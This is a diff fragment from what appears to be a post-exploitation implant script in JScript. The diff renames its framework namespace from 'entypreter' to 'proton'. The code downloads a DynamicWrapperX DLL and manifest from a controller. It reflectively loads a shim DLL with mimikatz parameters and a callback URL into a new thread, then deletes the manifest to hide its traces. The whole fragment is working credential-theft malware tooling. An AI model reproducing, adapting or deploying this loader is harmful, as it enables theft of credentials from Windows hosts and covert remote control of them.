@@ -35,13 +35,13 @@ function win32_write_memory(win32, str)
 
 try
 {
-    var manifestPath = entypreter.file.getPath("~DIRECTORY~\\dynwrapx.manifest");
-    entypreter.http.download(manifestPath, "~MANIFESTUUID~");
+    var manifestPath = proton.file.getPath("~DIRECTORY~\\dynwrapx.manifest");
+    proton.http.download(manifestPath, "~MANIFESTUUID~");
 
-    entypreter.http.download("~DIRECTORY~\\dynwrapx.dll", "~DLLUUID~");
+    proton.http.download("~DIRECTORY~\\dynwrapx.dll", "~DLLUUID~");
 
     var win32 = win32_register_via_dynwrapx(manifestPath)
-    var shim_lpParam = "~MIMICMD~~~~UUIDHEADER~~~~SHIMX64UUID~~~~MIMIX86UUID~~~~MIMIX64UUID~~~" + entypreter.work.make_url();
+    var shim_lpParam = "~MIMICMD~~~~UUIDHEADER~~~~SHIMX64UUID~~~~MIMIX86UUID~~~~MIMIX64UUID~~~" + proton.work.make_url();
 
     var arrDLL = [
       ~SHIMX86BYTES~
@@ -54,12 +54,12 @@ try
     var thread = win32.CreateThread(0, 0, pReflective, win32.StrPtr(shim_lpParam), 0, 0);
     win32.WaitForSingleObject(thread, 100000);
 
-    //entypreter.work.report("Success");
+    //proton.work.report("Success");
 }
 catch (e)
 {
-    entypreter.work.error(e);
+    proton.work.error(e);
 }
 
-entypreter.file.deleteFile(manifestPath);
-entypreter.exit();
+proton.file.deleteFile(manifestPath);
+proton.exit();
